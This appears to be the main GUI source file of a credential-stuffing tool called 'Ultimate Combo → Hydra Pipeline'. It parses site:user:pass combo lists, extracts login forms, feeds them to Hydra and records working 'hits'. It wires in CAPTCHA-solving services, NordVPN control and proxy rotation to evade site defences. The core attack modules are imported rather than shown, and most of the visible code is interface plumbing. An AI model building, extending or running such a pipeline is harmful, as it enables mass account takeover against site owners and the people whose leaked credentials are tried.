import csv
import json
import os
import platform
import queue
import shutil
import subprocess
import threading
import time
import uuid

import requests
from collections import defaultdict, deque
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from datetime import datetime, timedelta
from pathlib import Path

import tkinter as tk
from tkinter import filedialog, messagebox, ttk

from app_logging import logger
from config import DATA_DIR, HITS_DIR, LOGS_DIR, PROCESSED_SITES_FILE, config, download_gost, ensure_hydra_available, ensure_nordvpn_cli, get_effective_proxy, get_intercept_proxy, get_vpn_control, save_config
from extract import extract_login_form, test_credentials_for_site
from burp import BURP_DOWNLOAD_URL, launch_burp
from zap import import_data_to_zap, launch_zap
from helpers import COMMON_LOGIN_PATHS, get_base_url, get_site_filename, log_once, normalize_and_validate_target, normalize_site, split_three_fields
from runner import RunnerMixin
from proxies import ProxyManager
from project_io import (
    AutosaveWorker,
    atomic_write_json,
    build_project_payload,
    diagnostics_summary,
    export_rows_csv,
    export_rows_json,
    export_run_summaries_csv,
    export_timeline_csv,
    load_project_payload,
    site_report_rows,
    summarize_status_counts,
    top_failing_domains,
    utc_now_iso,
)
from run_summary import RunSummary, compute_run_summary, from_dict as run_summary_from_dict
from timeline import in_time_window, make_event, normalize_event, parse_ts


def apply_theme(root):
    style = ttk.Style(root)
    available = set(style.theme_names())
    preferred = "vista" if platform.system() == "Windows" and "vista" in available else "clam"
    if preferred in available:
        style.theme_use(preferred)

    base_pad = 8
    style.configure("TFrame", padding=base_pad)
    style.configure("TLabelframe", padding=base_pad)
    style.configure("TLabelframe.Label", font=("Segoe UI", 10, "bold"))
    style.configure("TLabel", font=("Segoe UI", 10))
    style.configure("Header.TLabel", font=("Segoe UI Semibold", 15))
    style.configure("TButton", padding=(12, 6), font=("Segoe UI", 10))
    style.configure("Treeview", font=("Segoe UI", 10), rowheight=30)
    style.configure("Treeview.Heading", font=("Segoe UI Semibold", 10))
    style.map("Treeview", background=[("selected", "#d9ebff")], foreground=[("selected", "#1f2937")])
    style.configure("TNotebook.Tab", padding=(16, 8), font=("Segoe UI Semibold", 10))


class CombinedParserGUI(RunnerMixin):
    def __init__(self, root):
        self.root = root
        apply_theme(self.root)
        self.root.title("Ultimate Combo → Hydra Pipeline")
        self.root.geometry("1450x980")
        self.root.minsize(1200, 720)

        self.input_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.forms_output_path = tk.StringVar()
        self.status_text = tk.StringVar(value="Ready.")
        self.state_text = tk.StringVar(value="Idle")
        self.header1 = tk.StringVar(value="site")
        self.header2 = tk.StringVar(value="user")
        self.header3 = tk.StringVar(value="pass")
        self.create_combo = tk.BooleanVar(value=True)
        self.extract_forms = tk.BooleanVar(value=True)
        self.skip_blank = tk.BooleanVar(value=True)
        self.trim_whitespace = tk.BooleanVar(value=True)
        self.use_proxy = tk.BooleanVar(value=get_vpn_control(config) == "nordvpn")
        self.proxy_url = tk.StringVar(value=config.get("proxy_url", ""))
        self.tld_only = tk.BooleanVar(value=True)
        self.threads = tk.IntVar(value=6)
        self.strict_validation = tk.BooleanVar(value=True)
        self.force_recheck = tk.BooleanVar(value=bool(config.get("force_recheck", False)))
        self.burp_proxy = tk.StringVar(value=config.get("burp_proxy", ""))
        self.use_burp = tk.BooleanVar(value=bool(config.get("use_burp", False)))
        self.zap_proxy = tk.StringVar(value=config.get("zap_proxy", "http://127.0.0.1:8080"))
        self.use_zap = tk.BooleanVar(value=bool(config.get("use_zap", False)))
        self.zap_api_key = tk.StringVar(value=config.get("zap_api_key", ""))
        self.auto_start_zap_daemon = tk.BooleanVar(value=bool(config.get("auto_start_zap_daemon", False)))
        self.proxy_rotation = tk.BooleanVar(value=bool(config.get("proxy_rotation", False)))
        self.proxy_list_file = tk.StringVar(value=config.get("proxy_list_file", ""))
        self.show_debug_details = tk.BooleanVar(value=False)
        self.extract_log_file = None
        self.runner_log_file = None
        self.proxy_manager = None

        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event = threading.Event()
        self.pause_event = threading.Event()
        self.ui_queue = queue.Queue()
        self._main_thread = threading.current_thread()
        self.gost_process = None

        self.timeline_events = []
        self.timeline_sort_state = {"column": "Time", "reverse": True}
        self.timeline_row_ids = {}
        self.timeline_coalesce = defaultdict(list)
        self.timeline_coalesce_last_summary = {}
        self.timeline_fetch_failures = deque()
        self.timeline_last_fetch_burst_ts = 0.0
        self.run_summaries = []
        self.run_history_sort_state = {"column": "Started", "reverse": True}
        self.active_run_context = None
        self.selected_run_id = None

        self.processed_file = PROCESSED_SITES_FILE
        self.processed_data = self.load_processed_data()
        self.sites_db = self.processed_data

        self.current_project_path = None
        self.current_project_name = "Untitled"
        self.project_created_ts = utc_now_iso()
        self.project_label_var = tk.StringVar(value="Project: Untitled")
        self.autosave_enabled = tk.BooleanVar(value=bool(config.get("autosave_enabled", True)))
        self.autosave_interval_minutes = tk.IntVar(value=int(config.get("autosave_interval_minutes", 2)))
        self.autosave_worker = AutosaveWorker(self._autosave_now)

        self.runner_tree = None
        self.hydra_log = None
        self.processing_thread = None
        self.notebook = None
        self.settings_window = None

        self.runner_rows_all = []
        self.runner_rows_view = []
        self.runner_sort_state = {}
        self.runner_last_sort_col = None
        self.runner_active_process = None
        self.runner_thread = None
        self.runner_running = False
        self.running_subprocesses = set()
        # FIX: Guard cleanup/logging paths to prevent recursive shutdown loops.
        self._cleaning_up = False
        self._cleanup_log_emitted = False

        self._build_ui()
        self._build_menu()
        self.root.after(100, self._drain_ui_queue)
        self.root.after(500, self.refresh_runner_list)  # slight delay to ensure widgets are ready
        self.root.after(700, self.run_startup_checks)
        self._schedule_autosave_tick()
        self.root.protocol("WM_DELETE_WINDOW", self.on_exit)


    # NEW: startup dependency checks for Hydra/Chromedriver/NordVPN/proxy
    def run_startup_checks(self):
        """Run startup checks in the background so the UI stays responsive."""
        if not bool(config.get("startup_dependency_checks", True)):
            return

        self.status_text.set("Running startup checks (Hydra, chromedriver, VPN, proxy)...")
        self.record_event("INFO", "ui", "startup_check_begin", "Startup checks started", {"async": True})
        results: queue.Queue[tuple[list[str], str]] = queue.Queue(maxsize=1)

        def _worker():
            issues = []
            final_status = "Ready."
            try:
                hydra_status = ensure_hydra_available(log_func=self._write_log_threadsafe)
                if not hydra_status.get("available"):
                    issues.append("Hydra unavailable (runner will not work)")
                else:
                    self._write_log_threadsafe(f"Hydra check: {hydra_status.get('message')}")

                driver_path = (config.get("chrome_driver_path") or "").strip()
                if driver_path:
                    self._write_log_threadsafe(f"Chromedriver check: ready ({driver_path})")
                else:
                    issues.append("Chromedriver path not initialized at startup")

                if get_vpn_control(config) == "nordvpn":
                    nord = ensure_nordvpn_cli(log_func=self._write_log_threadsafe)
                    if not nord.get("available"):
                        issues.append("NordVPN CLI missing (install required for vpn_control=nordvpn)")

                # FIXED: Proxy fallback + single chromedriver check
                proxy_url = str(config.get("proxy_url", "")).strip()
                if proxy_url:
                    proxy_cfg = {"http": proxy_url, "https": proxy_url}
                    try:
                        requests.get("https://httpbin.org/ip", proxies=proxy_cfg, timeout=5)
                        self._write_log_threadsafe("Proxy check: reachable via httpbin")
                    except Exception as proxy_exc:
                        config["proxy_url"] = ""
                        save_config()
                        issues.append("Configured proxy failed startup health check and was disabled")
                        self._write_log_threadsafe(f"[Proxy Fallback] Using direct connection ({proxy_exc})")

                if issues:
                    final_status = f"Startup checks finished with {len(issues)} warning(s)."
                else:
                    final_status = "Startup checks complete. Ready."
            except Exception as exc:
                issues.append(f"Startup checks failed: {exc}")
                final_status = "Startup checks failed. See log for details."
            results.put((issues, final_status))

        def _poll_results():
            try:
                issues, final_status = results.get_nowait()
            except queue.Empty:
                self.root.after(200, _poll_results)
                return

            self.status_text.set(final_status)
            if issues:
                self.record_event("WARN", "ui", "startup_check", "Startup dependency warnings", {"count": len(issues)})
                messagebox.showwarning("Startup checks", "\n".join(issues))
            else:
                self.record_event("INFO", "ui", "startup_check", "Startup dependency checks passed")

        threading.Thread(target=_worker, name="gui-startup-checks", daemon=True).start()
        self.root.after(200, _poll_results)

    def register_running_process(self, process):
        if process:
            self.running_subprocesses.add(process)

    def unregister_running_process(self, process):
        if process and process in self.running_subprocesses:
            self.running_subprocesses.remove(process)

    def terminate_all_running_processes(self, reason):
        # FIX: Re-entrancy guard to stop recursive terminate/log loops on close/cancel.
        self._cleaning_up = getattr(self, '_cleaning_up', False)
        if self._cleaning_up:
            return
        self._cleaning_up = True
        try:
            for proc in list(self.running_subprocesses):
                try:
                    if proc.poll() is None:
                        proc.terminate()
                        time.sleep(0.5)
                        if proc.poll() is None:
                            proc.kill()
                except Exception:
                    pass
                finally:
                    self.unregister_running_process(proc)
            if self.gost_process:
                try:
                    if self.gost_process.poll() is None:
                        self.gost_process.terminate()
                        time.sleep(0.2)
                        if self.gost_process.poll() is None:
                            self.gost_process.kill()
                except Exception:
                    pass
                finally:
                    self.gost_process = None
            if not self._cleanup_log_emitted:
                self._cleanup_log_emitted = True
                try:
                    self._write_log_threadsafe(f"Terminated subprocesses: {reason}")
                except Exception:
                    # FIX: Avoid recursive logging failures during teardown.
                    print(f"[cleanup] Terminated subprocesses: {reason}")
        finally:
            self._cleaning_up = False

    def load_processed_data(self):
        legacy_file = Path(__file__).resolve().parent / "processed_sites.json"
        if legacy_file.exists() and not self.processed_file.exists():
            try:
                shutil.copy2(legacy_file, self.processed_file)
                migrated_count = len(json.loads(self.processed_file.read_text(encoding="utf-8")) or {})
                self.record_event("INFO", "cache", "migrate", "Cache migrated (root -> DATA_DIR)", {"site_count": migrated_count})
            except Exception:
                pass

        if self.processed_file.exists():
            try:
                raw = json.loads(self.processed_file.read_text(encoding='utf-8'))
                migrated = self._migrate_processed_schema(raw)
                self.record_event("INFO", "cache", "load", "Cache loaded", {"site_count": len(migrated)})
                return migrated
            except Exception:
                return {}
        return {}

    def save_processed_data(self):
        self.processed_file.write_text(json.dumps(self.processed_data, indent=2), encoding='utf-8')

    def record_event(self, level, category, action, message, metrics=None, allow_coalesce=True):
        if hasattr(self, "_main_thread") and threading.current_thread() is not self._main_thread:
            self.ui_queue.put(("timeline_event", {
                "level": level,
                "category": category,
                "action": action,
                "message": message,
                "metrics": metrics,
                "allow_coalesce": allow_coalesce,
            }))
            return
        event = make_event(level, category, action, message, metrics=metrics)
        self.timeline_events.append(event)
        if allow_coalesce and event["level"] in {"WARN", "ERROR"}:
            self._record_coalesced_summary(event)
        if hasattr(self, "timeline_tree"):
            self.refresh_timeline_view()

    def _record_coalesced_summary(self, event):
        key = (event.get("category"), event.get("action"), event.get("level"))
        now = time.time()
        bucket = [ts for ts in self.timeline_coalesce.get(key, []) if now - ts <= 300]
        bucket.append(now)
        self.timeline_coalesce[key] = bucket
        last_summary = self.timeline_coalesce_last_summary.get(key, 0.0)
        if len(bucket) >= 6 and (now - last_summary) >= 60:
            self.record_event(
                "WARN",
                event.get("category", "network"),
                "summary",
                f"{event.get('action')} x{len(bucket)} in last 5m",
                metrics={"count": len(bucket), "window_minutes": 5},
                allow_coalesce=False,
            )
            self.timeline_coalesce_last_summary[key] = now
            self.timeline_coalesce[key] = []

    def _timeline_known_categories(self):
        default = ["project", "run", "ui", "network", "cache", "export", "proxy", "dns", "tls"]
        observed = sorted({str((e or {}).get("category") or "") for e in self.timeline_events if (e or {}).get("category")})
        return ["All"] + sorted(set(default + observed))

    def _build_menu(self):
        menu_bar = tk.Menu(self.root)
        file_menu = tk.Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="New Project", command=self.new_project)
        file_menu.add_command(label="Open Project", command=self.open_project)
        file_menu.add_command(label="Save Project", command=self.save_project)
        file_menu.add_command(label="Save Project As", command=lambda: self.save_project(as_new=True))
        export_menu = tk.Menu(file_menu, tearoff=0)
        export_menu.add_command(label="JSON", command=self.export_report_json)
        export_menu.add_command(label="CSV", command=self.export_report_csv)
        export_menu.add_command(label="Run Summaries CSV", command=self.export_run_summaries_csv)
        export_menu.add_command(label="Timeline CSV", command=self.export_timeline_csv)
        file_menu.add_cascade(label="Export", menu=export_menu)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.on_exit)
        menu_bar.add_cascade(label="File", menu=file_menu)
        self.root.config(menu=menu_bar)

    def _migrate_processed_schema(self, raw):
        migrated = {}
        for site, entry in (raw or {}).items():
            if not isinstance(entry, dict):
                entry = {}
            extracted = entry.get("extracted") or {}
            if not extracted and entry.get("form_found"):
                extracted = {
                    "action_url": entry.get("action") or entry.get("hydra_action"),
                    "confidence": entry.get("confidence"),
                }
            status = entry.get("status")
            if not status:
                if entry.get("form_found"):
                    status = "success"
                elif entry.get("failed_urls"):
                    status = "fetch_failed"
                else:
                    status = "pending"
            migrated[site] = {
                "first_seen_ts": entry.get("first_seen_ts") or entry.get("last_processed") or datetime.now().isoformat(),
                "last_checked_ts": entry.get("last_checked_ts") or entry.get("last_processed"),
                "status": status,
                "extracted": extracted,
                "last_error_code": entry.get("last_error_code"),
                "last_error_hint": entry.get("last_error_hint"),
                "last_error_detail": entry.get("last_error_detail") or entry.get("last_error_message"),
                "last_error_stacktrace": entry.get("last_error_stacktrace"),
                "combo_count": entry.get("combo_count", 0),
                "combo_path": entry.get("combo_path", ""),
                "hydra_command_template": entry.get("hydra_command_template", ""),
                "form_found": bool(entry.get("form_found")),
            }
        return migrated

    def _is_cache_fresh(self, entry, ttl_days):
        checked = entry.get("last_checked_ts")
        if not checked:
            return False
        try:
            checked_dt = datetime.fromisoformat(checked)
        except Exception:
            return False
        return (datetime.now() - checked_dt) <= timedelta(days=ttl_days)

    def _cache_skip_reason(self, base, retry_failed_only=False):
        if self.force_recheck.get():
            return None
        entry = self.processed_data.get(base) or {}
        status = entry.get("status")
        if retry_failed_only:
            if status not in {"fetch_failed", "failed"}:
                return "not failed"
            return None

        failed_ttl_days = int(config.get("failed_retry_ttl_days", 1))
        if status in {"fetch_failed", "failed"} and self._is_cache_fresh(entry, failed_ttl_days):
            return "recent fetch failure"

        ttl_days = int(config.get("cache_ttl_days", 30))
        if status in {"success", "success_form", "success_loginish", "no_form"} and self._is_cache_fresh(entry, ttl_days):
            if status in {"success", "success_form"} and not (entry.get("extracted") or {}).get("action_url"):
                return None
            return "already cached"
        return None

    def _write_log_threadsafe(self, text):
        # FIX: Avoid recursive UI/log churn while shutdown cleanup is active.
        if getattr(self, "_cleaning_up", False) and text.startswith("Terminated subprocesses:") and self._cleanup_log_emitted:
            print(f"[cleanup-log] {text}")
            return
        if self.extract_log_file:
            with self.extract_log_file.open("a", encoding="utf-8") as fh:
                fh.write(text + "\n")
        self.ui_queue.put(("extractor_log", text + "\n"))

    def _update_status_threadsafe(self, text):
        self.ui_queue.put(("status", text))

    def _update_progress_threadsafe(self, mode=None, maximum=None, value=None, stop=False):
        self.ui_queue.put(("progress", {"mode": mode, "maximum": maximum, "value": value, "stop": stop}))

    def _show_progress_threadsafe(self, show):
        self.ui_queue.put(("progress_visible", bool(show)))

    def _drain_ui_queue(self):
        while True:
            try:
                event, payload = self.ui_queue.get_nowait()
            except queue.Empty:
                break

            if event == "extractor_log":
                self.log.insert(tk.END, payload)
                self.log.see(tk.END)
            elif event == "hydra_log":
                self.hydra_log.insert(tk.END, payload)
                self.hydra_log.see(tk.END)
                if self.runner_log_file:
                    with self.runner_log_file.open("a", encoding="utf-8") as fh:
                        fh.write(payload)
            elif event == "status":
                self.status_text.set(payload)
            elif event == "runner_hit":
                hit = payload or {}
                if hasattr(self, "hits_tree") and self.hits_tree is not None:
                    self.hits_tree.insert("", "end", values=(hit.get("domain", ""), hit.get("username", ""), hit.get("password", ""), hit.get("timestamp", "")))
            elif event == "progress":
                if payload["mode"] is not None:
                    self.progress["mode"] = payload["mode"]
                if payload["maximum"] is not None:
                    self.progress["maximum"] = payload["maximum"]
                if payload["value"] is not None:
                    self.progress["value"] = payload["value"]
                if payload["stop"]:
                    self.progress.stop()
            elif event == "progress_visible":
                if payload:
                    self.progress.grid()
                else:
                    self.progress.grid_remove()
            elif event == "pipeline_done":
                self.cleanup_after_pipeline(payload)
            elif event == "runner_done":
                self.finish_runner_execution(payload)
            elif event == "runner_refresh":
                self.apply_runner_filters_and_sort()
            elif event == "critical_error":
                messagebox.showerror("Error", payload)
            elif event == "timeline_event":
                self.record_event(
                    payload.get("level"),
                    payload.get("category"),
                    payload.get("action"),
                    payload.get("message"),
                    metrics=payload.get("metrics"),
                    allow_coalesce=bool(payload.get("allow_coalesce", True)),
                )

        self.root.after(100, self._drain_ui_queue)

    def _build_ui(self):
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

        container = ttk.Frame(self.root, padding=8)
        container.grid(row=0, column=0, sticky="nsew")
        container.columnconfigure(0, weight=1)
        container.rowconfigure(0, weight=1)
        container.rowconfigure(1, weight=0)

        notebook = ttk.Notebook(container)
        self.notebook = notebook
        notebook.grid(row=0, column=0, sticky="nsew")

        extractor_tab = ttk.Frame(notebook)
        notebook.add(extractor_tab, text="Extractor")

        runner_tab = ttk.Frame(notebook)
        notebook.add(runner_tab, text="Hydra Runner")

        burp_tab = ttk.Frame(notebook)
        notebook.add(burp_tab, text="Burp Tester")

        zap_tab = ttk.Frame(notebook)
        notebook.add(zap_tab, text="ZAP Tester")

        troubleshooting_tab = ttk.Frame(notebook)
        notebook.add(troubleshooting_tab, text="Troubleshooting")

        timeline_tab = ttk.Frame(notebook)
        notebook.add(timeline_tab, text="Timeline")

        self.build_extractor_tab(extractor_tab)
        self.build_runner_tab(runner_tab)
        self.build_burp_tab(burp_tab)
        self.build_zap_tab(zap_tab)
        self.build_troubleshooting_tab(troubleshooting_tab)
        self.build_timeline_tab(timeline_tab)

        status_bar = ttk.Frame(container, padding=(8, 4))
        status_bar.grid(row=1, column=0, sticky="ew")
        status_bar.columnconfigure(0, weight=1)
        ttk.Label(status_bar, textvariable=self.status_text).grid(row=0, column=0, sticky="w")
        ttk.Label(status_bar, textvariable=self.project_label_var).grid(row=0, column=1, sticky="e", padx=(4, 20))
        ttk.Label(status_bar, textvariable=self.state_text).grid(row=0, column=2, sticky="e")

        def on_tab_changed(event):
            selected_tab = notebook.select()
            if selected_tab == notebook.tabs()[1]:
                try:
                    self.refresh_runner_list()
                except AttributeError:
                    pass

        notebook.bind("<<NotebookTabChanged>>", on_tab_changed)

    def _bind_scroll_wheel(self, widget, y_target=None, x_target=None):
        y_target = y_target or widget
        x_target = x_target or widget

        def _scroll_vertical(units):
            y_target.yview_scroll(units, "units")
            return "break"

        def _scroll_horizontal(units):
            x_target.xview_scroll(units, "units")
            return "break"

        system = platform.system()
        if system in {"Windows", "Darwin"}:
            def on_mousewheel(event):
                delta = event.delta
                if system == "Darwin":
                    units = -1 if delta > 0 else 1
                else:
                    units = int(-1 * (delta / 120)) if delta else 0
                if units:
                    return _scroll_vertical(units)

            def on_shift_mousewheel(event):
                delta = event.delta
                if system == "Darwin":
                    units = -1 if delta > 0 else 1
                else:
                    units = int(-1 * (delta / 120)) if delta else 0
                if units:
                    return _scroll_horizontal(units)

            widget.bind("<MouseWheel>", on_mousewheel, add="+")
            widget.bind("<Shift-MouseWheel>", on_shift_mousewheel, add="+")
        else:
            widget.bind("<Button-4>", lambda _e: _scroll_vertical(-1), add="+")
            widget.bind("<Button-5>", lambda _e: _scroll_vertical(1), add="+")
            widget.bind("<Shift-Button-4>", lambda _e: _scroll_horizontal(-1), add="+")
            widget.bind("<Shift-Button-5>", lambda _e: _scroll_horizontal(1), add="+")

    def build_extractor_tab(self, tab):
        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(0, weight=1)

        main = ttk.Frame(tab, padding=12)
        main.grid(row=0, column=0, sticky="nsew")
        main.columnconfigure(0, weight=1)
        main.rowconfigure(4, weight=1)

        ttk.Label(main, text="Combo Parser + Advanced Form Extractor", style="Header.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 8))

        io_grid = ttk.Frame(main)
        io_grid.grid(row=1, column=0, sticky="ew", pady=(0, 8))
        for idx in range(3):
            io_grid.columnconfigure(idx, weight=1)

        inp_f = ttk.LabelFrame(io_grid, text="Input (file or folder)")
        inp_f.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        inp_f.columnconfigure(0, weight=1)
        ttk.Entry(inp_f, textvariable=self.input_path).grid(row=0, column=0, sticky="ew", padx=(0, 8))
        ttk.Button(inp_f, text="File", command=self.choose_input_file).grid(row=0, column=1, padx=(0, 4))
        ttk.Button(inp_f, text="Folder", command=self.choose_input_folder).grid(row=0, column=2)

        out_f = ttk.LabelFrame(io_grid, text="Main CSV Output")
        out_f.grid(row=0, column=1, sticky="nsew", padx=4)
        out_f.columnconfigure(0, weight=1)
        ttk.Entry(out_f, textvariable=self.output_path).grid(row=0, column=0, sticky="ew", padx=(0, 8))
        ttk.Button(out_f, text="Save As", command=self.choose_output_file).grid(row=0, column=1)

        forms_f = ttk.LabelFrame(io_grid, text="Hydra Forms CSV")
        forms_f.grid(row=0, column=2, sticky="nsew", padx=(8, 0))
        forms_f.columnconfigure(0, weight=1)
        ttk.Entry(forms_f, textvariable=self.forms_output_path).grid(row=0, column=0, sticky="ew", padx=(0, 8))
        ttk.Button(forms_f, text="Save As", command=self.choose_forms_output_file).grid(row=0, column=1)

        mid_grid = ttk.Frame(main)
        mid_grid.grid(row=2, column=0, sticky="ew", pady=(0, 8))
        for idx in range(3):
            mid_grid.columnconfigure(idx, weight=1)

        head_f = ttk.LabelFrame(mid_grid, text="CSV Headers")
        head_f.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        for i, txt, var in zip(range(3), ["Column 1 (site)", "Column 2 (user)", "Column 3 (pass)"], [self.header1, self.header2, self.header3]):
            ttk.Label(head_f, text=txt).grid(row=i, column=0, sticky="w", padx=(0, 6), pady=4)
            ttk.Entry(head_f, textvariable=var, width=40).grid(row=i, column=1, sticky="ew", pady=4)
        head_f.columnconfigure(1, weight=1)

        opt_f = ttk.LabelFrame(mid_grid, text="Options")
        opt_f.grid(row=0, column=1, sticky="nsew", padx=4)
        ttk.Checkbutton(opt_f, text="Skip blank lines", variable=self.skip_blank).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Trim whitespace", variable=self.trim_whitespace).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Create user:pass combo.txt per site", variable=self.create_combo).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Extract login forms", variable=self.extract_forms).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Strict form validation", variable=self.strict_validation).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Force recheck (ignore cache TTL)", variable=self.force_recheck).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Show debug details", variable=self.show_debug_details).pack(anchor="w", pady=4)

        proxy_f = ttk.LabelFrame(mid_grid, text="Proxy / VPN (NordVPN Auto)")
        proxy_f.grid(row=0, column=2, sticky="nsew", padx=(8, 0))
        ttk.Label(proxy_f, text="VPN behavior is controlled by Settings → vpn_control").pack(anchor="w")
        ttk.Label(proxy_f, text="Use proxy_url for an already-running SOCKS/HTTP proxy").pack(anchor="w")

        thread_f = ttk.LabelFrame(main, text="Extraction Speed")
        thread_f.grid(row=3, column=0, sticky="ew", pady=(0, 8))
        thread_f.columnconfigure(0, weight=1)
        ttk.Label(thread_f, text="Threads (4-8 recommended):").grid(row=0, column=0, sticky="w")
        ttk.Scale(thread_f, from_=1, to=12, orient="horizontal", variable=self.threads, command=lambda v: self.threads.set(int(round(float(v))))).grid(row=1, column=0, sticky="ew", padx=8)
        ttk.Label(thread_f, textvariable=self.threads).grid(row=0, column=1, rowspan=2, sticky="e", padx=(8, 0))

        action_row = ttk.Frame(main)
        action_row.grid(row=4, column=0, sticky="nsew")
        action_row.columnconfigure(0, weight=1)
        action_row.rowconfigure(2, weight=1)

        btn_f = ttk.Frame(action_row)
        btn_f.grid(row=0, column=0, sticky="e", pady=(0, 8))
        self.start_button = ttk.Button(btn_f, text="Start Pipeline", command=self.start_pipeline)
        self.start_button.pack(side="left", padx=4)
        self.pause_button = ttk.Button(btn_f, text="Pause", command=self.toggle_pause, state="disabled")
        self.pause_button.pack(side="left", padx=4)
        self.cancel_button = ttk.Button(btn_f, text="Cancel", command=self.cancel_pipeline, state="disabled")
        self.cancel_button.pack(side="left", padx=(12, 4))
        self.retry_button = ttk.Button(btn_f, text="Resume Failed", command=self.resume_failed)
        self.retry_button.pack(side="left", padx=4)
        ttk.Button(btn_f, text="Settings", command=self.open_settings).pack(side="left", padx=4)
        ttk.Button(btn_f, text="Test Credentials (Selected Site)", command=self.on_test_credentials_selected).pack(side="left", padx=4)
        ttk.Button(btn_f, text="Clear Log", command=self.clear_log).pack(side="left", padx=4)

        self.progress = ttk.Progressbar(action_row, orient="horizontal", mode="determinate")
        self.progress.grid(row=1, column=0, sticky="ew", pady=(0, 8))
        self.progress.grid_remove()

        log_f = ttk.LabelFrame(action_row, text="Extraction Log")
        log_f.grid(row=2, column=0, sticky="nsew")
        log_f.columnconfigure(0, weight=1)
        log_f.rowconfigure(0, weight=1)

        self.log = tk.Text(log_f, height=18, wrap="none", font=("Consolas", 10), padx=8, pady=8)
        self.log.grid(row=0, column=0, sticky="nsew")
        log_y = ttk.Scrollbar(log_f, orient="vertical", command=self.log.yview)
        log_y.grid(row=0, column=1, sticky="ns")
        log_x = ttk.Scrollbar(log_f, orient="horizontal", command=self.log.xview)
        log_x.grid(row=1, column=0, sticky="ew")
        self.log.configure(yscrollcommand=log_y.set, xscrollcommand=log_x.set)
        self._bind_scroll_wheel(self.log)

    def on_test_credentials_selected(self):
        if not self.runner_rows_all:
            self.refresh_runner_list()
        selected = [r.get("site") for r in self.runner_rows_all if r.get("selected")]
        if not selected:
            messagebox.showinfo("Credential Test", "Select a site in Hydra Runner first.")
            return
        site = selected[0]
        pdata = (self.processed_data or {}).get(site) or {}
        extracted = pdata.get("extracted") or {}
        combo_path = pdata.get("combo_path")
        if not combo_path or not Path(combo_path).exists():
            messagebox.showerror("Credential Test", f"Combo file missing for {site}")
            return
        combos = [ln.strip() for ln in Path(combo_path).read_text(encoding="utf-8", errors="replace").splitlines() if ln.strip()]
        result = test_credentials_for_site(extracted, combos)
        messagebox.showinfo("Credential Test", f"{site}: hits={result.get('hits',0)} status={result.get('status')}")

    def open_settings(self):
        settings_window = tk.Toplevel(self.root)
        self.settings_window = settings_window
        settings_window.title("Settings")
        settings_window.geometry("760x760")
        settings_window.minsize(640, 520)

        outer = ttk.Frame(settings_window)
        outer.pack(fill="both", expand=True)

        canvas = tk.Canvas(outer, highlightthickness=0)
        canvas.pack(side="left", fill="both", expand=True)
        y_scroll = ttk.Scrollbar(outer, orient="vertical", command=canvas.yview)
        y_scroll.pack(side="right", fill="y")
        canvas.configure(yscrollcommand=y_scroll.set)

        content = ttk.Frame(canvas, padding=12)
        content_window = canvas.create_window((0, 0), window=content, anchor="nw")

        def _refresh_scroll_region(_event=None):
            canvas.configure(scrollregion=canvas.bbox("all"))

        def _sync_content_width(event):
            canvas.itemconfigure(content_window, width=event.width)

        content.bind("<Configure>", _refresh_scroll_region)
        canvas.bind("<Configure>", _sync_content_width)
        self._bind_scroll_wheel(canvas, y_target=canvas)
        self._bind_scroll_wheel(content, y_target=canvas)

        creds_frame = ttk.LabelFrame(content, text="Credential & API Settings")
        creds_frame.pack(fill="x", padx=6, pady=(0, 8))

        ttk.Label(creds_frame, text="DeathByCaptcha Username").pack(anchor="w", padx=10, pady=(8, 2))
        self.dbc_user = tk.StringVar(value=config.get("dbc_user", ""))
        ttk.Entry(creds_frame, textvariable=self.dbc_user).pack(fill="x", padx=10, pady=(0, 8))

        ttk.Label(creds_frame, text="DeathByCaptcha Password").pack(anchor="w", padx=10, pady=(0, 2))
        self.dbc_pass = tk.StringVar(value=config.get("dbc_pass", ""))
        ttk.Entry(creds_frame, textvariable=self.dbc_pass, show="*").pack(fill="x", padx=10, pady=(0, 8))

        ttk.Label(creds_frame, text="NordVPN Token").pack(anchor="w", padx=10, pady=(0, 2))
        self.nord_token = tk.StringVar(value=config.get("nord_token", ""))
        ttk.Entry(creds_frame, textvariable=self.nord_token).pack(fill="x", padx=10, pady=(0, 8))

        ttk.Label(creds_frame, text="2Captcha API Key (optional)").pack(anchor="w", padx=10, pady=(0, 2))
        self.twocaptcha_key = tk.StringVar(value=config.get("twocaptcha_key", ""))
        ttk.Entry(creds_frame, textvariable=self.twocaptcha_key).pack(padx=10, pady=(0, 8), fill="x")

        ttk.Label(creds_frame, text="Anti-Captcha API Key (optional)").pack(anchor="w", padx=10, pady=(0, 2))
        self.anticaptcha_key = tk.StringVar(value=config.get("anticaptcha_key", ""))
        ttk.Entry(creds_frame, textvariable=self.anticaptcha_key).pack(padx=10, pady=(0, 8), fill="x")

        ttk.Label(creds_frame, text="Capsolver API Key (optional)").pack(anchor="w", padx=10, pady=(0, 2))
        self.capsolver_key = tk.StringVar(value=config.get("capsolver_key", ""))
        ttk.Entry(creds_frame, textvariable=self.capsolver_key).pack(padx=10, pady=(0, 10), fill="x")

        network_frame = ttk.LabelFrame(content, text="Network & Cache")
        network_frame.pack(fill="x", padx=6, pady=8)

        ttk.Label(network_frame, text="VPN Control").pack(anchor="w", padx=10, pady=(8, 2))
        self.vpn_control = tk.StringVar(value=get_vpn_control(config))
        ttk.Combobox(network_frame, textvariable=self.vpn_control, values=["none", "nordvpn"], state="readonly").pack(fill="x", padx=10, pady=(0, 8))

        ttk.Label(network_frame, text="Proxy URL (optional, socks5/http)").pack(anchor="w", padx=10, pady=(0, 2))
        self.proxy_url_setting = tk.StringVar(value=config.get("proxy_url", ""))
        ttk.Entry(network_frame, textvariable=self.proxy_url_setting).pack(fill="x", padx=10, pady=(0, 8))

